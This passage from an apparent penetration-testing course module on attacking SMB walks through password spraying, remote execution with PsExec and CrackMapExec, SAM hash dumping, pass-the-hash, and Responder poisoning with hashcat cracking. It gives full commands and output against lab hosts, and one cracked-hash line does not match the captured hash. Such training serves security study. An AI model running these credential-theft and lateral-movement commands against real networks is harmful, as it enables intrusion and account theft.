<p>Password spraying is a better alternative since we can target a list of usernames with one common password to avoid account lockouts. We can try more than one password if we know the account lockout threshold. Typically, two to three attempts are safe, provided we wait 30-60 minutes between attempts. Let&#39;s explore the tool <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> that includes the ability to execute password spraying.</p>
<p>With CrackMapExec (CME), we can target multiple IPs, using numerous users and passwords. Let&#39;s explore an everyday use case for password spraying. To perform a password spray against one IP, we can use the option <code>-u</code> to specify a file with a user list and <code>-p</code> to specify a password. This will attempt to authenticate every user from the list using the provided password.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
&lt;SNIP&gt;
jurena
</code></pre>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ crackmapexec smb <span class="hljs-number">10.10.110.17</span> -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[*]</span> Windows <span class="hljs-number">10</span>.<span class="hljs-number">0</span> Build <span class="hljs-number">18362</span> (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[-]</span> WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[-]</span> WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[-]</span> WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[-]</span> WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[-]</span> WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[-]</span> WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[-]</span> WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

&lt;SNIP&gt;

SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[+]</span> WIN7BOX\jurena:Company01! (Pwn3d!)
</code></pre>
<p>Note: By default CME will exit after a successful login is found. Using the <code>--continue-on-success</code> flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option <code>--local-auth</code>. For a more detailed study Password Spraying see the Active Directory Enumeration &amp; Attacks module.</p>
<p>For more detailed usage instructions, check out the tool&#39;s <a href="https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials">documentation guide</a>.</p>
<p><strong>SMB</strong></p>
<p>Linux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.</p>
<p>When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:</p>
<ul>
<li>Remote Command Execution</li>
<li>Extract Hashes from SAM Database</li>
<li>Enumerating Logged-on Users</li>
<li>Pass-the-Hash (PTH)</li>
</ul>
<p>Let&#39;s discuss how we can perform such operations. Additionally, we will learn how the SMB protocol can be abused to retrieve a user&#39;s hash as a method to escalate privileges or gain access to a network.</p>
<p><strong>Remote Code Execution (RCE)</strong></p>
<p>Before jumping into how to execute a command on a remote system using SMB, let&#39;s talk about Sysinternals. The Windows Sysinternals website was created in 1996 by <a href="https://en.wikipedia.org/wiki/Mark\_Russinovich">Mark Russinovich</a> and <a href="https://en-academic.com/dic.nsf/enwiki/2358707">Bryce Cogswell</a> to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.</p>
<p>Sysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the <a href="https://docs.microsoft.com/en-us/sysinternals/">Microsoft website</a>. One of those freeware tools to administer remote systems is PsExec.</p>
<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a <a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">named pipe</a> that can send commands to the system.</p>
<p>We can download PsExec from <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">Microsoft website</a>, or we can use some Linux implementations:</p>
<ul>
<li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">Impacket PsExec</a> - Python PsExec like functionality example using <a href="https://github.com/kavika13/RemCom">RemComSvc</a>.</li>
<li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">Impacket SMBExec</a> - A similar approach to PsExec without using <a href="https://github.com/kavika13/RemCom">RemComSvc</a>. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.</li>
<li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">Impacket atexec</a> - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</li>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> - includes an implementation of <code>smbexec</code> and <code>atexec</code>.</li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md">Metasploit PsExec</a> - Ruby PsExec implementation.</li>
</ul>
<p><strong>Impacket PsExec</strong></p>
<p>To use <code>impacket-psexec</code>, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ impacket-psexec -h

Impacket v0.<span class="hljs-number">9.22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-<span class="hljs-keyword">file</span> <span class="hljs-keyword">FILE</span>] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-<span class="hljs-keyword">port</span> [destination <span class="hljs-keyword">port</span>]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]&lt;targetName <span class="hljs-keyword">or</span> address&gt;
  command               command (<span class="hljs-keyword">or</span> arguments <span class="hljs-keyword">if</span> -c <span class="hljs-keyword">is</span> used) <span class="hljs-keyword">to</span> execute at the target (w/o path) - (<span class="hljs-keyword">default</span>:cmd.exe)

optional arguments:
  -h, <span class="hljs-comment">--help            show this help message and exit</span>
  -c pathname           copy the filename <span class="hljs-keyword">for</span> later execution, arguments are passed <span class="hljs-keyword">in</span> the command option
  -path PATH            path <span class="hljs-keyword">of</span> the command <span class="hljs-keyword">to</span> execute
  -<span class="hljs-keyword">file</span> <span class="hljs-keyword">FILE</span>            alternative RemCom binary (be sure it doesn<span class="hljs-symbol">'t</span> require CRT)
  -ts                   adds timestamp <span class="hljs-keyword">to</span> every logging output
  -debug                Turn DEBUG output <span class="hljs-keyword">ON</span>

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format <span class="hljs-keyword">is</span> LMHASH:NTHASH
  -no-pass              don<span class="hljs-symbol">'t</span> ask <span class="hljs-keyword">for</span> password (useful <span class="hljs-keyword">for</span> -k)
  -k                    <span class="hljs-keyword">Use</span> Kerberos authentication. Grabs credentials from ccache <span class="hljs-keyword">file</span> (KRB5CCNAME) based <span class="hljs-keyword">on</span> target parameters. <span class="hljs-keyword">If</span> valid credentials cannot be found, it will <span class="hljs-keyword">use</span> the
                        ones specified <span class="hljs-keyword">in</span> the command <span class="hljs-literal">line</span>
  -aesKey hex key       AES key <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">for</span> Kerberos Authentication (<span class="hljs-number">128</span> <span class="hljs-keyword">or</span> <span class="hljs-number">256</span> bits)
  -keytab KEYTAB        Read keys <span class="hljs-keyword">for</span> SPN from keytab <span class="hljs-keyword">file</span>

connection:
  -dc-ip ip address     IP Address <span class="hljs-keyword">of</span> the domain controller. <span class="hljs-keyword">If</span> omitted it will <span class="hljs-keyword">use</span> the domain part (FQDN) specified <span class="hljs-keyword">in</span> the target parameter
  -target-ip ip address
                        IP Address <span class="hljs-keyword">of</span> the target machine. <span class="hljs-keyword">If</span> omitted it will <span class="hljs-keyword">use</span> whatever was specified as target. This <span class="hljs-keyword">is</span> useful <span class="hljs-keyword">when</span> target <span class="hljs-keyword">is</span> the NetBIOS name <span class="hljs-keyword">and</span> you cannot resolve
                        it
  -<span class="hljs-keyword">port</span> [destination <span class="hljs-keyword">port</span>]
                        Destination <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> SMB Server
  -service-name service_name
                        The name <span class="hljs-keyword">of</span> the service used <span class="hljs-keyword">to</span> trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name <span class="hljs-keyword">of</span> the executable uploaded <span class="hljs-keyword">on</span> the target
</code></pre>
<p>To connect to a remote machine with a local administrator account, using <code>impacket-psexec</code>, you can use the following command:</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ impacket-psexec administrator:<span class="hljs-string">'Password123!'</span>@<span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span>

<span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.9</span><span class="hljs-number">.22</span> - <span class="hljs-symbol">Copyright</span> <span class="hljs-number">2020</span> <span class="hljs-symbol">SecureAuth</span> <span class="hljs-symbol">Corporation</span>

[*] <span class="hljs-symbol">Requesting</span> shares on <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span>.....
[*] <span class="hljs-symbol">Found</span> writable share <span class="hljs-symbol">ADMIN</span>$
[*] <span class="hljs-symbol">Uploading</span> file <span class="hljs-symbol">EHtJXgng</span>.exe
[*] <span class="hljs-symbol">Opening</span> <span class="hljs-symbol">SVCManager</span> on <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span>.....
[*] <span class="hljs-symbol">Creating</span> service nbAc on <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span>.....
[*] <span class="hljs-symbol">Starting</span> service nbAc.....
[!] <span class="hljs-symbol">Press</span> help for extra shell commands
<span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Windows</span> [<span class="hljs-symbol">Version</span> <span class="hljs-number">10.0</span><span class="hljs-number">.19041</span><span class="hljs-number">.1415</span>]
(c) <span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Corporation</span>. <span class="hljs-symbol">All</span> rights reserved.


<span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\system32&gt;whoami &amp;&amp; hostname

nt authority\system
<span class="hljs-symbol">WIN7BOX</span>
</code></pre>
<p>The same options apply to <code>impacket-smbexec</code> and <code>impacket-atexec</code>.</p>
<p><strong>CrackMapExec</strong></p>
<p>Another tool we can use to run CMD or PowerShell is <code>CrackMapExec</code>. One advantage of <code>CrackMapExec</code> is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, <code>smb</code>, the IP address or IP address range, the option <code>-u</code> for username, and <code>-p</code> for the password, and the option <code>-x</code> to run cmd commands or uppercase <code>-X</code> to run PowerShell commands.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">110.17</span> -u Administrator -p <span class="hljs-string">'Password123!'</span> -x <span class="hljs-string">'whoami'</span> --exec-<span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">smbexec</span>

<span class="hljs-title">SMB</span>         10.10.110.17 445    <span class="hljs-title">WIN7BOX</span>  [*] <span class="hljs-title">Windows</span> 10.0 <span class="hljs-title">Build</span> 19041 <span class="hljs-params">(name:WIN7BOX)</span> <span class="hljs-params">(domain:.)</span> <span class="hljs-params">(signing:<span class="hljs-keyword">False</span>)</span> <span class="hljs-params">(SMBv1:<span class="hljs-keyword">False</span>)</span>
<span class="hljs-title">SMB</span>         10.10.110.17 445    <span class="hljs-title">WIN7BOX</span>  [+] .\<span class="hljs-title">Administrator</span>:</span>Password123! (Pwn3d!)
SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">110.17</span> <span class="hljs-number">445</span>    WIN7BOX  [+] Executed command via smbexec
SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">110.17</span> <span class="hljs-number">445</span>    WIN7BOX  nt authority\system
</code></pre>
<p>Note: If the<code>--exec-method</code> is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the <code>--exec-method</code> smbexec.</p>
<p><strong>Enumerating Logged-on Users</strong></p>
<p>Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use <code>CrackMapExec</code> to enumerate logged-on users on all machines within the same network <code>10.10.110.17/24</code>, which speeds up our enumeration process.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.0</span>/<span class="hljs-number">24</span> -u administrator -p <span class="hljs-string">'Password123!'</span> --loggedon-users

SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.17</span> <span class="hljs-number">445</span>    WIN7BOX  [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">18362</span> (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.17</span> <span class="hljs-number">445</span>    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.17</span> <span class="hljs-number">445</span>    WIN7BOX  [+] Enumerated loggedon users
SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.17</span> <span class="hljs-number">445</span>    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.17</span> <span class="hljs-number">445</span>    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.21</span> <span class="hljs-number">445</span>    WIN10BOX  [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">19041</span> (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.21</span> <span class="hljs-number">445</span>    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.21</span> <span class="hljs-number">445</span>    WIN10BOX  [+] Enumerated loggedon users
SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.21</span> <span class="hljs-number">445</span>    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
</code></pre>
<p><strong>Extract Hashes from SAM Database</strong></p>
<p>The Security Account Manager (SAM) is a database file that stores users&#39; passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:</p>
<ul>
<li>Authenticate as another user.</li>
<li>Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.</li>
<li>Pass The Hash. We will discuss it later in this section.</li>
</ul>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> -u administrator -p <span class="hljs-string">'Password123!'</span> --sam

SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">18362</span> (<span class="hljs-string">name:</span>WIN7BOX) (<span class="hljs-string">domain:</span>WIN7BOX) (<span class="hljs-string">signing:</span>False) (<span class="hljs-string">SMBv1:</span>False)
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  [+] WIN7BOX\<span class="hljs-string">administrator:</span>Password123! (Pwn3d!)
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  [+] Dumping SAM hashes
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">2</span><span class="hljs-string">b576acbe6bcfda7294d6bd18041b8fe:</span>::
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">DefaultAccount:</span><span class="hljs-number">503</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">WDAGUtilityAccount:</span><span class="hljs-number">504</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">5717e1619</span><span class="hljs-string">e16b9179ef2e7138c749d65:</span>::
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">jurena:</span><span class="hljs-number">1001</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">209</span><span class="hljs-string">c6174da490caeb422f3fa5a7ae634:</span>::
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">demouser:</span><span class="hljs-number">1002</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">4</span><span class="hljs-string">c090b2a4a9a78b43510ceec3a60f90b:</span>::
SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span> <span class="hljs-number">445</span>    WIN7BOX  [+] Added <span class="hljs-number">6</span> SAM hashes to the database
</code></pre>
<p><strong>Pass-the-Hash (PtH)</strong></p>
<p>If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user&#39;s password instead of the plaintext password. We can use a PtH attack with any <code>Impacket</code> tool, <code>SMBMap</code>, <code>CrackMapExec</code>, among other tools. Here is an example of how this would work with <code>CrackMapExec</code>:</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ crackmapexec smb <span class="hljs-number">10.10.110.17</span> -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[*]</span> Windows <span class="hljs-number">10</span>.<span class="hljs-number">0</span> Build <span class="hljs-number">19041</span> (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         <span class="hljs-number">10.10.110.17</span> <span class="hljs-number">445</span>    WIN7BOX  <span class="hljs-string">[+]</span> WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
</code></pre>
<p><strong>Forced Authentication Attacks</strong></p>
<p>We can also abuse the SMB protocol by creating a fake SMB Server to capture users&#39; <a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">NetNTLM v1/v2 hashes</a>.</p>
<p>The most common tool to perform such operations is the <code>Responder</code>. <a href="https://github.com/lgandx/Responder">Responder</a> is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.</p>
<p>Let&#39;s illustrate an example to understand better how <code>Responder</code> works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root@</span>htb[/htb]$ responder -I &lt;<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">name</span>&gt;</span>
</code></pre>
<p>When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host&#39;s IP address by its hostname. On Windows machines, the procedure will roughly be as follows:</p>
<ul>
<li>The hostname file share&#39;s IP address is required.</li>
<li>The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.</li>
<li>If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.</li>
<li>Is there no local DNS record? A query will be sent to the DNS server that has been configured.</li>
<li>If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.</li>
</ul>
<p>Suppose a user mistyped a shared folder&#39;s name <code>\\mysharefoder\</code> instead of <code>\\mysharedfolder\</code>. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR &amp; MDNS Responder <span class="hljs-number">3.0.6.0</span>

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

<span class="hljs-string">[+]</span> Poisoners:                
    LLMNR                      <span class="hljs-string">[ON]</span>
    NBT-NS                     <span class="hljs-string">[ON]</span>        
    DNS/MDNS                   <span class="hljs-string">[ON]</span>   

<span class="hljs-string">[+]</span> Servers:         
    HTTP server                <span class="hljs-string">[ON]</span>                                   
    HTTPS server               <span class="hljs-string">[ON]</span>
    WPAD proxy                 <span class="hljs-string">[OFF]</span>                                  
    Auth proxy                 <span class="hljs-string">[OFF]</span>
    SMB server                 <span class="hljs-string">[ON]</span>                                   
    Kerberos server            <span class="hljs-string">[ON]</span>                                   
    SQL server                 <span class="hljs-string">[ON]</span>                                   
    FTP server                 <span class="hljs-string">[ON]</span>                                   
    IMAP server                <span class="hljs-string">[ON]</span>                                   
    POP3 server                <span class="hljs-string">[ON]</span>                                   
    SMTP server                <span class="hljs-string">[ON]</span>                                   
    DNS server                 <span class="hljs-string">[ON]</span>                                   
    LDAP server                <span class="hljs-string">[ON]</span>
    RDP server                 <span class="hljs-string">[ON]</span>
    DCE-RPC server             <span class="hljs-string">[ON]</span>
    WinRM server               <span class="hljs-string">[ON]</span>                                   

<span class="hljs-string">[+]</span> HTTP Options:                                                                  
    Always serving EXE         <span class="hljs-string">[OFF]</span>                                               
    Serving EXE                <span class="hljs-string">[OFF]</span>                                               
    Serving HTML               <span class="hljs-string">[OFF]</span>                                               
    Upstream Proxy             <span class="hljs-string">[OFF]</span>                                               

<span class="hljs-string">[+]</span> Poisoning Options:                                                             
    Analyze Mode               <span class="hljs-string">[OFF]</span>                                               
    Force WPAD auth            <span class="hljs-string">[OFF]</span>                                               
    Force Basic Auth           <span class="hljs-string">[OFF]</span>                                               
    Force LM downgrade         <span class="hljs-string">[OFF]</span>                                               
    Fingerprint hosts          <span class="hljs-string">[OFF]</span>                                               

<span class="hljs-string">[+]</span> Generic Options:                                                               
    Responder NIC              <span class="hljs-string">[tun0]</span>                                              
    Responder IP               <span class="hljs-string">[10.10.14.198]</span>                                      
    Challenge set              <span class="hljs-string">[random]</span>                                            
    Don't Respond To Names     <span class="hljs-string">['ISATAP']</span>                                          

<span class="hljs-string">[+]</span> Current Session Variables:                                                     
    Responder Machine Name     <span class="hljs-string">[WIN-2TY1Z1CIGXH]</span>   
    Responder Domain Name      <span class="hljs-string">[HF2L.LOCAL]</span>                                        
    Responder DCE-RPC Port     <span class="hljs-string">[48162]</span> 

<span class="hljs-string">[+]</span> Listening for events... 

<span class="hljs-string">[*]</span> <span class="hljs-string">[NBT-NS]</span> Poisoned answer sent to <span class="hljs-number">10.10.110.17</span> for name WORKGROUP (service: Domain Master Browser)
<span class="hljs-string">[*]</span> <span class="hljs-string">[NBT-NS]</span> Poisoned answer sent to <span class="hljs-number">10.10.110.17</span> for name WORKGROUP (service: Browser Election)
<span class="hljs-string">[*]</span> <span class="hljs-string">[MDNS]</span> Poisoned answer sent to <span class="hljs-number">10.10.110.17</span>   for name mysharefoder.local
<span class="hljs-string">[*]</span> <span class="hljs-string">[LLMNR]</span>  Poisoned answer sent to <span class="hljs-number">10.10.110.17</span> for name mysharefoder
<span class="hljs-string">[*]</span> <span class="hljs-string">[MDNS]</span> Poisoned answer sent to <span class="hljs-number">10.10.110.17</span>   for name mysharefoder.local
<span class="hljs-string">[SMB]</span> NTLMv2-SSP Client   : <span class="hljs-number">10.10.110.17</span>
<span class="hljs-string">[SMB]</span> NTLMv2-SSP Username : WIN7BOX\demouser
<span class="hljs-string">[SMB]</span> NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
</code></pre>
<p>These captured credentials can be cracked using <a href="https://hashcat.net/hashcat/">hashcat</a> or relayed to a remote host to complete the authentication and impersonate the user.</p>
<p>All saved Hashes are located in Responder&#39;s logs directory (<code>/usr/share/responder/logs/</code>). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.</p>
<p>Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don&#39;t match but still represent the same password.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -m <span class="hljs-number">5600</span> hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6<span class="hljs-number">.1</span><span class="hljs-number">.1</span>) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="hljs-number">14344386</span>
* Bytes.....: <span class="hljs-number">139921355</span>
* Keyspace..: <span class="hljs-number">14344386</span>

ADMINISTRATOR::WIN<span class="hljs-number">-487</span>IMQOIA8E:<span class="hljs-number">997</span>b18cc61099ba2:<span class="hljs-number">3</span>cc46296b0ccfc7a231d918ae1dae521:<span class="hljs-number">0101000000000000</span>b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN<span class="hljs-number">-487</span>IMQOIA8E:<span class="hljs-number">997</span>b18cc61099ba2:<span class="hljs-number">3</span>cc..<span class="hljs-number">.000000</span>
